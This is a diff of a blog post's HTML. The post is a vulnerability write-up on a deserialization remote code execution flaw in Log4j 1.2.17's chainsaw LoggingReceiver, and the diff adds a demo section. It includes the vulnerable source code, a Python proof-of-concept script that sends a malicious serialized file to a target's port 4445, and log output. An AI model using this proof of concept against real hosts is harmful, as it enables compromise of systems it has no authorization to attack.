@@ -13,16 +13,16 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="Attackers can use this vulnerability as a backdoor to maintain permissions.">
+  <meta name="description" content="not CVE-2019-17571 not CVE-2019-17571 not CVE-2019-17571">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Log4j1.2.17 RCE">
 <meta property="og:url" content="http://novysodope.github.io/2021/10/28/63/index.html">
 <meta property="og:site_name" content="novy&#39;s Blog">
-<meta property="og:description" content="Attackers can use this vulnerability as a backdoor to maintain permissions.">
+<meta property="og:description" content="not CVE-2019-17571 not CVE-2019-17571 not CVE-2019-17571">
 <meta property="og:locale">
 <meta property="og:image" content="http://novysodope.github.io/images/63/1.png">
 <meta property="article:published_time" content="2021-10-28T10:24:21.000Z">
-<meta property="article:modified_time" content="2021-10-28T03:41:24.131Z">
+<meta property="article:modified_time" content="2021-12-29T02:09:38.590Z">
 <meta property="article:author" content="novy">
 <meta property="article:tag" content="JAVA反序列化">
 <meta name="twitter:card" content="summary_large_image">
@@ -205,7 +205,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2.3k 字
+      2.7k 字
     </span>
   
 
@@ -214,7 +214,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      7 分钟
+      9 分钟
     </span>
   
 
@@ -247,7 +247,7 @@
             
             <div class="markdown-body">
               <p>Vulnerability discovered in early 2020.</p>
-<p>Unlike CVE-2019-17571, the vulnerability I found is located in class LoggingReceiver <code>org.apache.log4j.chainsaw.LoggingReceiver</code> .<br>(According to the disclosed CVE-2019-17571 vulnerability details, the location of his vulnerability occurred at org.apache.log4j.net.SocketNode). </p>
+<p>After reading CVE-2019-17571, I found that there is another vulnerability under chainsaw，there is a deserialization process for socket data in the LoggingReceiver class, and the lack of verification leads to the occurrence of vulnerabilities </p>
 <p>Vulnerability analysis:<br>Set the listening port in the setupReceiver method on line 133 of src/main/java/org/apache/log4j/chainsaw/Main.java</p>
 <figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setupReceiver</span><span class="hljs-params">(MyTableModel aModel)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> port = <span class="hljs-number">4445</span>;<br>        String strRep = System.getProperty(<span class="hljs-string">&quot;chainsaw.port&quot;</span>);<br>        <span class="hljs-keyword">if</span> (strRep != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                port = Integer.parseInt(strRep);<br>            &#125; <span class="hljs-keyword">catch</span> (NumberFormatException var6) &#123;<br>                LOG.fatal(<span class="hljs-string">&quot;Unable to parse chainsaw.port property with value &quot;</span>+ strRep + <span class="hljs-string">&quot;.&quot;</span>);<br>                JOptionPane.showMessageDialog(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;Unable to parse port number from&#x27;&quot;</span> + strRep + <span class="hljs-string">&quot;&#x27;, quitting.&quot;</span>, <span class="hljs-string">&quot;CHAINSAW&quot;</span>, <span class="hljs-number">0</span>);<br>                System.exit(<span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br><br></code></pre></div></td></tr></table></figure>
 <p>Then go to the LoggingReceiver class to process related connection information:</p>
@@ -267,7 +267,11 @@
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">import</span> socket<br>s = socket.socket()<br>host = <span class="hljs-string">&quot;172.20.10.14&quot;</span><span class="hljs-comment">#target ip</span><br>port = <span class="hljs-number">4445</span><span class="hljs-comment">#The listening port set by the component</span><br>s.connect((host,port))<br>ssss = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;exp.ser&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)//Malicious data<br>xc = ssss.read()<br>s.send(xc)<br>s.close()<br></code></pre></div></td></tr></table></figure>
 <p>running exp.py can trigger the vulnerability.</p>
 <p><img src="/images/63/1.png" srcset="/img/loading.gif" lazyload></p>
-<p>CVE-2019-17571 refer to:<br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1829640" title="log4j反序列化漏洞分析">log4j反序列化漏洞分析</a></p>
+<h2 id="OR"><a href="#OR" class="headerlink" title="OR"></a>OR</h2><p>Web demo:</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Log4jVul</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        String[] arg = &#123;&#125;;<br>        Main.main(arg);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<p>When you run the above demo, you will be prompted:</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">[main] DEBUG org.apache.log4j.chainsaw.MyTableModel - Total time [ms]: 1 <span class="hljs-keyword">in</span> update, size: 0<br>[Thread-4] INFO org.apache.log4j.chainsaw.LoggingReceiver - Thread started<br>[Thread-4] DEBUG org.apache.log4j.chainsaw.LoggingReceiver - Waiting <span class="hljs-keyword">for</span> a connection<br></code></pre></div></td></tr></table></figure>
+<p>It will prompt to wait for a connection. At this time, sending malicious serialized data to port 4445 will trigger the vulnerability.</p>
 
             </div>
             <hr>
